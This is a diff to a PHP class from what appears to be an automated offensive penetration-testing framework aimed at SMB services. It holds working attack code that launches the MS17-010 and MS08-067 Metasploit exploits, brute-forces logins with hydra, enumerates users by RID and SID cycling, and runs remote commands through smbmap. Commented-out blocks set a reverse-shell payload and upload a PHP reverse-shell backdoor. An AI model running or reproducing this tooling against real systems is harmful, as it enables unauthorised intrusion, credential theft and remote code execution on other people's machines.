@@ -61,8 +61,8 @@ class service2smb extends SERVICE {
    https://www.hackingarticles.in/smb-penetration-testing-port-445/
    
  */
-    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo) {
-        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo);
+    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf) {
+        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf);
     }
 
     function service2smb2ms08_067_netapi2nmap(){
@@ -75,6 +75,7 @@ class service2smb extends SERVICE {
     }
     
     function service2smb2ms17_010_netapi2msf(){
+        $this->ssTitre(__FUNCTION__);
         $result = ""; // \nset TARGET 25 \nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast
         $query = "echo \"db_status\n use exploit/windows/smb/ms17_010_netapi\n set RHOST \"$this->ip\"\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
         $this->requette($query);
@@ -86,7 +87,7 @@ class service2smb extends SERVICE {
     
     function service2smb2ms17_010_netapi2nmap(){
         $result = "";
-        $result .= $this->ssTitre(__FUNCTION__);
+        $this->ssTitre(__FUNCTION__);
         $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms17-010.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
         $result .= $this->cmd("localhost",$query);
         $result .= $this->req_ret_str($query);       
@@ -94,6 +95,7 @@ class service2smb extends SERVICE {
     }
 
     function service2smb2ms08_067_netapi2msf(){
+        $this->ssTitre(__FUNCTION__);
         $result = ""; // \nset TARGET 25 \nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast
         $query = "echo \"db_status\n use exploit/windows/smb/ms08_067_netapi\n set RHOST \"$this->ip\"\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
 		$this->requette($query);
@@ -104,6 +106,7 @@ class service2smb extends SERVICE {
     }
     
     function service2smb4nmap(){
+        $this->titre(__FUNCTION__);
         $result = "";
         $os = $this->req_ret_str("echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-os-discovery.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -");
         
@@ -206,7 +209,6 @@ class service2smb extends SERVICE {
         
         // Aucun resultat 
         //$query = "nmap -Pn -n --script smb-brute.nse --script-args userdb=$this->dico_users,passdb=$this->dico_users -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
-        //$result .= $this->cmd("localhost",$query);
         // $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
         
         return $result;
@@ -217,7 +219,7 @@ class service2smb extends SERVICE {
     function service2smb4exec(){ // 445 + 139 + 137
         $result = "";
 
-            $result .= $this->ssTitre(__FUNCTION__);
+        $this->titre(__FUNCTION__);
             /*
         $query = "echo \"db_status\nuse exploit/linux/samba/trans2open\nset RHOST $kio1_service_smb->ip\nset RPORT $kio1_service_smb->port\nset payload linux/x86/shell_reverse_tcp\nset LHOST $prof\nshow options\nexploit\nexit -y\n \" > $this->dir_tmp/".__FUNCTION__.".$kio1_service_smb->ip.$kio1_service_smb->port.rc";
 		$this->requette($query);
@@ -227,55 +229,64 @@ class service2smb extends SERVICE {
             //if(!file_exists("$this->dir_tmp/trans2root")) $this->requette("gcc $this->dir_tools/exploits/trans2root.c -o $this->dir_tmp/trans2root -w");
             //$result .= $this->req_ret_str("$this->dir_tmp/trans2root -t $this->ip");
             
-            $result .= $this->service2smb4nmap();
-            $this->pause();
+            //$this->service2smb4nmap();$this->pause();
             
-            //$result .= $this->service2smb2ms08_067_netapi2nmap();
-            //$result .= $this->service2smb2ms08_067_netapi2msf();
+            //$this->service2smb2ms08_067_netapi2nmap();
+            //$this->service2smb2ms08_067_netapi2msf();
             //
             $this->pause();
            
             
-            $users_test = array("root","admin","administrator","guest","user","test","nobody","none");
-                foreach ($users_test as $user_test){
-                    $result .= $this->article("USER Test", "$user_test");
-                    $result .= $this->port2auth4pass4hydra("smb",$user_test,"password");
-                    }
-                    $this->pause();
-                    
-            $result .= $this->service2msrpc();
+            $this->article("just for compare", "remove later enum4linux");
+            $query = "perl $this->dir_tools/enum4linux.pl $this->ip";
+            //$this->requette($query);
+            
+            $this->service2smb4users("WORKGROUP","", "");
+
+            //$this->service2msrpc();
             $this->pause();
             
-            $sql_r = "select distinct(user2name) FROM USERS WHERE id8port = '$this->port2id' ORDER BY user2name;";            
-            $conn = $this->mysql_ressource->query($sql_r);
-            while ($row = $conn->fetch_assoc()){
-                $user2name = trim($row['user2name']);
-                $result .= $this->article("USER FOUND", "$user2name");
-                    $result .= $this->port2auth4pass4hydra("smb",$user2name,"password");
-                
-            }
-            $this->pause();
 
             
+            $tab_users_shell = $this->ip2users();
+            foreach ($tab_users_shell as $user2name_shell){
+                $result .= $this->article("USER FOUND FOR TEST", "$user2name_shell");
+                $this->port2auth4pass4hydra("smb",$user2name_shell,"password");$this->pause();
+                $this->port2auth4pass4hydra("smb",$user2name_shell,"");$this->pause();
+                $this->port2auth4dico4hydra("smb",$user2name_shell);$this->pause();
+            }
+
+            $this->pause();
             $work_groups = $this->service2smb4workgroup();
+            
+            var_dump($work_groups);
+            $this->pause();
+            foreach ($work_groups as $work_group) {
+                $work_group = trim($work_group);
+                $this->service2smb4smb($work_group,"","");$this->pause();
+                foreach ($tab_users_shell as $user2name_shell){
+                    $result .= $this->article("USER/PASSWORD FOUND FOR TEST", "$user2name_shell");
+                    $this->service2smb4smb($work_group,$user2name_shell,"password");$this->pause();
+                }
+            }
             
             $users = $this->ip2users4passwd();
             foreach ($users as $user2name => $user2pass){
                 if(!empty($user2name))
             foreach ($work_groups as $work_group)	{
+                $work_group = trim($work_group);
                     $query_hydra = "hydra -l \"$user2name\" -p \"$user2pass\" $this->ip smb -f -s $this->port -w 5s -I 2>/dev/null  | grep -i 'login:'  | grep -i 'password:' ";
-                    $result .= $this->cmd("localhost",$query_hydra);
                     $check = $this->req_ret_str($query_hydra);
                     if(!empty($check)){  
-                        $result .= $this->auth2login4hydra($check); 
-                        $result .= $this->service2smb4smb($work_group,$user2name,$user2pass);
+                        $this->auth2login4hydra($check); 
+                        $this->service2smb4smb($work_group,$user2name,$user2pass);$this->pause();
                      
                         $query = "nmap --script smb-psexec.nse --script-args=smbuser=$user2name,smbpass=$user2pass -s$this->protocol -p $this->port $this->ip";
-                        $result .= $this->req_ret_str($query);
+                        $this->req_ret_str($query);
                         $cmd_unix = "id";
-                        $result .= $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x \"$cmd_unix\" 2> /dev/null ");
-                        $result .= $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x 'net group \"Domain Admins\" /domain'");
-                        
+                        $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x \"$cmd_unix\" 2> /dev/null ");
+                        $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x 'net group \"Domain Admins\" /domain'");
+                        $this->pause();
                        
                 }
             }
@@ -288,10 +299,9 @@ class service2smb extends SERVICE {
     
     function service2smb4workgroup(){
         $result = "";
-        $result .= $this->ssTitre(__FUNCTION__);
         $this->ssTitre("Got domain/workgroup name");
         $work_groups = $this->req_ret_tab("nmblookup -A $this->ip | grep '<GROUP>' | grep '<00>' | cut -d'<' -f1 ");
-        
+        $this->pause();
         if (!empty($work_groups)){
             foreach ($work_groups as $work_group){
                 $work_group = trim($work_group);
@@ -299,9 +309,10 @@ class service2smb extends SERVICE {
             }
             return $work_groups;
         }
-        
-        $work_group = $this->service2smb4query("WORKGROUP",'','',"lsaquery","");// 445 only
-        $work_group = trim($work_group);
+        $this->pause();
+        $tmp = $this->service2smb4query("WORKGROUP",'','',"lsaquery","");// 445 only
+        exec("echo '$tmp' | grep 'Domain Name:' | cut -d':' -f2 ",$rst);
+        if (isset($rst[0])) $work_group = trim($rst[0]);
         if (!empty($work_group)) return array($work_group);
         else return array("WORKGROUP");
     }
@@ -395,24 +406,72 @@ class service2smb extends SERVICE {
     
     function service2smb4users4method4($work_group,$user2name, $user2pass){
         $this->ssTitre(__FUNCTION__);
+        $tmp = "";
         $users_found = array();
         $this->ssTitre("Find User By Dico Number - RID ".__FUNCTION__);        
-            if ( (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"queryuser 500"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"queryuser 1000"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"queryuser 1500"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"queryuser 300"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) ){
-                for ($i=1;$i<=3050;$i++)    $tmp = trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex($i)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "))."\n"; // 445 + 139
-            
-            
-             
+        for ($i=0;$i<=55;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
+        for ($i=495;$i<=555;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
+        for ($i=995;$i<=1055;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
+        
+            var_dump($tmp);
+             $this->pause();
+             $tmp = trim($tmp);
+             if (empty($tmp)) return $users_found;
             $users_found = array_unique(explode("\n", $tmp));
             foreach ($users_found as $user_found )
                 if (!empty($user_found))  {
-                    $this->yesUSERS($this->port2id, $user_found,__FUNCTION__,"query user with rid ");
+                    //$this->yesUSERS($this->port2id, $user_found,__FUNCTION__,"query user with rid ");
                 }
-        }
+        
         $users_found = array_unique($users_found);
-        //var_dump($users_found);$this->pause();
+        var_dump($users_found);$this->pause();
         return $users_found;
     }
     
+
+    public function service2smb2sid($work_group,$user2name,$user2pass){
+        $this->ssTitre("Attempting to get SID");
+        $tmp_sid = array();
+        $tab_sids = array();
+        $sid_lsaenumsid = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaenumsid","");// 445 only
+        var_dump($sid_lsaenumsid);$this->pause();
+        
+        $sid_lsaquery = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaquery","");// 445 only
+        var_dump($sid_lsaquery);$this->pause();
+        
+        $users_test = file($this->dico_users);
+        $sid_lookupnames = "";
+        foreach ($users_test as $user_test){
+            $user_test = trim($user_test);
+            $tmp = "";
+            $tmp = $this->service2smb4query($work_group,$user2name,$user2pass,"lookupnames $user_test"," | grep -E \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{0,}\" | awk '{print $2}' | grep -Po \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{1,}\" | sort -u");// 445 only
+            if (!empty($tmp)) {
+                $sid_lookupnames .= $tmp;
+
+            }
+        }
+        var_dump($sid_lookupnames);$this->pause();
+        $this->pause();
+        $query = "echo '$sid_lsaenumsid.$sid_lsaquery.$sid_lookupnames' | grep -Po \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{1,}\" | sort -u";
+        exec($query,$tmp_sid);
+        var_dump($tmp_sid);$this->pause();
+        
+        foreach ($tmp_sid as $sid_tmp){
+            $query = "echo '$sid_tmp' | cut -d'-' -f1-\$(echo '$sid_tmp' | grep -Po '-' | wc -l) ";
+            $sid = trim($this->req_ret_str($query));
+            if (!empty($sid)) $tab_sids[] = $sid;
+        }
+        
+        
+        if (!empty($tab_sids)) {
+            $tab_sids = array_filter(array_unique($tab_sids));
+            sort($tab_sids);
+        }
+        var_dump($tab_sids);$this->pause();
+        return $tab_sids;
+    }
+    
+ 
     
     
     function service2smb4users4method5($work_group,$user2name, $user2pass){
@@ -420,43 +479,40 @@ class service2smb extends SERVICE {
         $users_found = array();
         $this->ssTitre("Attempting to get SID");
         
-        $tmp = "";
-        $sid_lsaenumsid = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaenumsid","");// 445 only
+      
         
-        exec("echo '$sid_lsaenumsid' | grep -Po \"S-1-5-21-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}\" | sort -u",$tmp_sid);
-        if(!empty($tmp_sid[0])) {$tmp = $this->auth2login_sid($tmp_sid[0], $user2name, $user2pass);
-        $users_found = array_unique(explode("\n", $tmp));
+        $tab_sids = $this->service2smb2sid($work_group, $user2name, $user2pass);
+        var_dump($tab_sids);$this->pause();
+        $tmp2 = "";
+        foreach ($tab_sids as $sid){
+            if (!empty($sid)) {
+                $this->article("SID", $sid);
+                
+                for ($rid = 0;$rid<=55;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid'  "); // | cut -d'\' -f2  | cut -d'(' -f1
+                for ($rid = 100;$rid<=155;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid'  "); // | cut -d'\' -f2  | cut -d'(' -f1
+                for ($rid = 495;$rid<=555;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v '*unknown*' ");
+                for ($rid = 995;$rid<=1055;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*' ");
+                
+            }
+        }
+        
+        var_dump($tmp2);
+        $this->pause();
+        $tmp2 = trim($tmp2);
+        if (empty($tmp2)) return $users_found;
+        
+        $users_found = array_filter(array_unique(explode("\n", $tmp2)));
         if (!empty($users_found))
             foreach ($users_found as $user_found )
                 if (!empty($user_found))  {
-                    $this->yesUSERS($this->port2id, $user_found, __FUNCTION__,"lsaenumsid");
+                    //$this->yesUSERS($this->port2id, $user_found, __FUNCTION__,"lookupnames");
                 }
-        }
-        $users_found = array_unique($users_found);
-        //var_dump($users_found);$this->pause();
-        return $users_found;
-    }
-    
-    
-    
-    function service2smb4users4method6($work_group,$user2name, $user2pass){
-        $users_found = array();
-        $this->ssTitre(__FUNCTION__);
-        
-        $sid_lsaquery = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaquery","");// 445 only
-        
-        exec("echo '$sid_lsaquery' | grep -Po \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}\" ",$tmp_sid);
-        if(!empty($tmp_sid[0])) {$tmp = $this->auth2login_sid($tmp_sid[0], $user2name, $user2pass);
-        $users_found = array_unique(explode("\n", $tmp));
-        if (!empty($user_found))
-            foreach ($users_found as $user_found )
-                if (!empty($user_found))  {
-                  $this->yesUSERS($this->port2id, $user_found, __FUNCTION__,"lsaquery");
-                }
-        }
-        $users_found = array_unique($users_found);
-        //var_dump($users_found);$this->pause();
-        return $users_found;
+            
+            
+            
+            var_dump($users_found);$this->pause();
+            
+            return $users_found;
     }
     
     
@@ -465,52 +521,79 @@ class service2smb extends SERVICE {
         $this->titre("Attempting to get userlist ");
         
         $users_found = array();
+
+        for ($rid = 500;$rid<=550;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids S-1-22-1-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid' | cut -d'\' -f2  | cut -d'(' -f1"); // | cut -d'\' -f2  | cut -d'(' -f1
+        for ($rid = 1000;$rid<=1050;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids S-1-22-1-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid' | cut -d'\' -f2  | cut -d'(' -f1"); // | cut -d'\' -f2  | cut -d'(' -f1
+        var_dump($tmp2);
+        $this->pause();
+        $tmp2 = trim($tmp2);
+        if (empty($tmp2)) return $users_found;
+        else {
+        $users_found = array_filter(array_unique(explode("\n", $tmp2)));
+        if (!empty($users_found))
+            foreach ($users_found as $user_found )
+                if (!empty($user_found))  {
+                    $this->yesUSERS($this->port2id, $user_found, __FUNCTION__,"lookupsids");
+                }
+            
+            
+            
+            var_dump($users_found);$this->pause();
+            
+            if(!empty($users_found)) return $users_found;
+        }
+            
+        if(!empty($users_found)) return $users_found;
+        else $users_found = $this->service2smb4users4method5($work_group, $user2name, $user2pass);
+        $this->pause();
+        
         
         
         $users_found =  $this->service2smb4users4method1($work_group, $user2name, $user2pass);
+        $this->pause();
         
         if(!empty($users_found)) return $users_found;
         else $users_found = $this->service2smb4users4method2($work_group, $user2name, $user2pass);
-        
+        $this->pause();
         
         if(!empty($users_found)) return $users_found;
         else $users_found = $this->service2smb4users4method3($work_group, $user2name, $user2pass);
-        
+        $this->pause();
         
         if(!empty($users_found)) return $users_found;
         else $users_found = $this->service2smb4users4method4($work_group, $user2name, $user2pass);
-        
+        $this->pause();
+  
         
         if(!empty($users_found)) return $users_found;
         else $users_found = $this->service2smb4users4method5($work_group, $user2name, $user2pass);
-        
-        
-        if(!empty($users_found)) return $users_found;
-        else $users_found = $this->service2smb4users4method6($work_group, $user2name, $user2pass);
+        $this->pause();
         
 
         
-        
-        //var_dump($users_found);$this->pause();
+        var_dump($users_found);$this->pause();
+
         return $users_found;
     }
     
     
     
-    function service2smb4query($work_group,$user2name, $user2pass,$query){
-        return $this->req_ret_str("echo '$this->root_passwd' | sudo -S rpcclient -W '$work_group' -U '$user2name'%'$user2pass' -c '$query'  '$this->ip' -p $this->port 2> /dev/null  |  grep -v \"NT_STATUS\" | grep -v \"could not\"  | grep -v -i 'FAILURE' | grep -v \"Connection failed\"  | grep -v \"Bad SMB2 signature for message\" | grep -v 'Unable to initialize messaging context' | grep -v \"\[0000\]\"   | grep -v 'smb_signing_good: BAD SIG:'   ");
+    function service2smb4query($work_group,$user2name, $user2pass,$query,$filter){
+        $work_group = trim($work_group);
+        $user2name = trim($user2name);
+        $user2pass = trim($user2pass);
+        return $this->req_ret_str("echo '$this->root_passwd' | sudo -S rpcclient -W '$work_group' -U '$user2name'%'$user2pass' -c '$query'  '$this->ip' -p $this->port 2> /dev/null  $filter   ");
     }
     
     function service2smb4groups($work_group,$user2name, $user2pass){
         
         $result = "";
         
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups builtin","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups domain","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"enumdomgroups","");
-        if ( (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex(500)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex(1000)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex(1500)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) OR (!empty(trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex(300)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ")))) ){
-        for ($i=1;$i<=3050;$i++)    $result .= trim($this->service2smb4query($work_group,$user2name, $user2pass,"querygroup 0x".dechex($i)," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "))."\n"; // 445 + 139
-        }
+        $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups builtin","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups domain","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"enumdomgroups","");
+         //   for ($i=0;$i<=50;$i++)  $result .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ",""); // 445 + 139
+ 
         
         $result = trim($result);
         return array_unique(explode("\n", $result));
@@ -521,38 +604,38 @@ class service2smb extends SERVICE {
     
     function service2smb4os($work_group,$user2name, $user2pass){
         $result = "";
-        $result .= $this->titre(__FUNCTION__);
-        $result .= $this->ssTitre("Attempting to make $user2name session and get OS info");
+        $this->titre(__FUNCTION__);
+        $this->ssTitre("Attempting to make $user2name session and get OS info");
         
         $query = "smbclient -W '$work_group' -L $this->ip -U '$user2name'%'$user2pass'  2>/dev/null ";
-        $result .= $this->cmd("localhost", $query);  $result .= $this->req_ret_str($query);
+          $result .= $this->req_ret_str($query);
         
         $query = "smbclient -W '$work_group' -L $this->ip -U '$user2name'%'$user2pass'  2>/dev/null | grep -Po \"[A-Z]{1,5}\\\\\$\" | cut -d'$' -f1 ";
-        $result .= $this->cmd("localhost", $query);
+        
         $reps = $this->req_ret_str($query);
         $result .= $reps;
         
         $query = "smbclient //$this->ip/IPC$  -U '$user2name'%'$user2pass' -t 1 -c \"help\"  2>/dev/null "; // 445 + 139
-        $result .= $this->cmd("localhost", $query);  $result .= $this->req_ret_str($query);
+          $this->req_ret_str($query);
         
         $query = "smbclient //$this->ip/IPC$  -U '$user2name'%'$user2pass' -t 1 -c \"listconnect\"  2>/dev/null "; // 445 + 139
-        $result .= $this->cmd("localhost", $query);  $result .= $this->req_ret_str($query);
+          $this->req_ret_str($query);
         
-        $result .= $this->ssTitre("Attempting map to share");
+        $this->ssTitre("Attempting map to share");
         $tab_reps = explode("\n", $reps);
         foreach ($tab_reps as $rep){
             $rep = trim($rep);
             if (!empty($rep)) {
                 $this->article("Working with REP ",$rep);
                 $query = "smbclient -W '$work_group' //$this->ip/$rep$ -U '$user2name'%'$user2pass' -c 'ls'  2>/dev/null  |  grep -v \"NT_STATUS\" | grep -v \"could not\"  | grep -v \"Connection failed\"  | grep -v \"Bad SMB2 signature for message\" | grep -v \"\[0000\]\" ";  // 445 + 139
-                $result .= $this->cmd("localhost", $query);$result .= $this->req_ret_str($query);
+                $this->req_ret_str($query);
                 
-                $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"netsharegetinfo $rep","");
+                $this->service2smb4query($work_group,$user2name, $user2pass,"netsharegetinfo $rep","");
             }
         }
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"srvinfo","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"netshareenumall","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"netdiskenum","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"srvinfo","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"netshareenumall","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"netdiskenum","");
         
         return $result ;
     }
@@ -560,17 +643,16 @@ class service2smb extends SERVICE {
     
     function service2smb4smb($work_group,$user2name, $user2pass){ // 445 + 139
         $result = "";
-        $result .= $this->ssTitre(__FUNCTION__);
+        $this->titre(__FUNCTION__);
         $users = array();
-        $users = $this->service2smb4users($work_group,$user2name, $user2pass);
-        $this->pause();
+
         
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"querydominfo","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"enum","");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"querydominfo","");$this->pause();
+        $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");$this->pause();
+        $this->service2smb4query($work_group,$user2name, $user2pass,"enum","");$this->pause();
+        $this->service2smb4query($work_group,$user2name, $user2pass,"getusername","");$this->pause();
         
-        $result .= $this->service2smb4os($work_group,$user2name, $user2pass);
+        $this->service2smb4os($work_group,$user2name, $user2pass);$this->pause();
         
        
         $users = array_unique($users);
@@ -580,20 +662,20 @@ class service2smb extends SERVICE {
                 if(!empty($user)){
                     $this->article("USER", $user[0]);
                     //var_dump($user);$this->pause();
-                    $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"queryuser $user[0]","");
+                    $this->service2smb4query($work_group,$user2name, $user2pass,"queryuser $user[0]","");
                     $query = "hydra -l \"$user[0]\" -P \"$this->dico_password.1000\" $this->ip smb -t 8 -e nsr -s $this->port -w 5s 2>/dev/null  | grep -i  'login:' ";
-                    $result .= $this->cmd("localhost", $query);$result .= $this->auth2login4hydra($this->req_ret_str($query));
+                    $this->auth2login4hydra($this->req_ret_str($query));
                 }
         }
         
-        $result .= $this->ssTitre("Attempting to get printer info");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"enumprinters","");
+        $this->ssTitre("Attempting to get printer info");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"enumprinters","");
         
-        $result .= $this->ssTitre("Attempting to get Domain Password Policy info");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"getdompwinfo","");
+        $this->ssTitre("Attempting to get Domain Password Policy info");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"getdompwinfo","");
         
-        $result .= $this->ssTitre("Attempting to get user Password Policy info");
-        $result .= $this->service2smb4query($work_group,$user2name, $user2pass,"getusrpwinfo","");
+        $this->ssTitre("Attempting to get user Password Policy info");
+        $this->service2smb4query($work_group,$user2name, $user2pass,"getusrpwinfo","");
         
         // S-1-5-21
         // https://msdn.microsoft.com/en-us/library/windows/desktop/aa379649(v=vs.85).aspx
@@ -1005,7 +1087,7 @@ class service2smb extends SERVICE {
         
         
         
-        //$result .= $this->req_ret_str("medusa -h $this->ip -M smbnt ");
+        //$this->req_ret_str("medusa -h $this->ip -M smbnt ");
         $this->note("The net use  \\[target_IP]\C$ [admin password] /u:[admin name] will establish an administrative session with the target (Windows NT/2000
 system.
 		It is not used to gain an interactive shell (which requires much more than the administrative password) or to map a drive");
@@ -1020,7 +1102,7 @@ system.
         /*
          $backdoor_php = new FILE("$this->dir_tmp/backdoor_php.php");
          $backdoor_php->backdoor_com_php_simple_reverse($this->prof, 9999);
-         $result .= $this->req_ret_str("smbclient //$this->ip/IPC$ -N -U -t 1 -c \"put $backdoor_php->file_path \" ");
+         $this->req_ret_str("smbclient //$this->ip/IPC$ -N -U -t 1 -c \"put $backdoor_php->file_path \" ");
          */
         
         return $result;
